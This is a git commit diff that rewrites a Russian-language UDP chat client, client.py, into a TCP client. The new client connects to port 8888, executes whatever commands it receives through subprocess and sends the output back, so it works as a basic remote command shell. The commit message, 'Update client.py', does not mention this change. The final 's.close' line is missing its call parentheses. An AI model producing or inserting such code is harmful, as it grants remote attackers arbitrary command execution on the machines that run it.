63b27498b2af9e302ac07f9b83e7e94df0992633
Абудаби <108343640+Lendoros@users.noreply.github.com>
2025-10-17 23:54:41 +0300

    Update client.py

--- client.py
+++ client.py
@@ -1,9 +1,13 @@
 import socket
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-while True:
-    msg = input("Введите сообщение ('exit' для выхода): ")
-    s.sendto(msg.encode('utf-8'), ('127.0.0.1', 8888))
-    if msg == 'exit':
+import subprocess
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('127.0.0.1',8888))
+while 1:
+    command = s.recv(1024).decode()
+    if command.lower() == 'exit':
         break
-s.close()
+    output = subprocess.getoutput(command)
+    s.send(output.encode())
+s.close
+
 
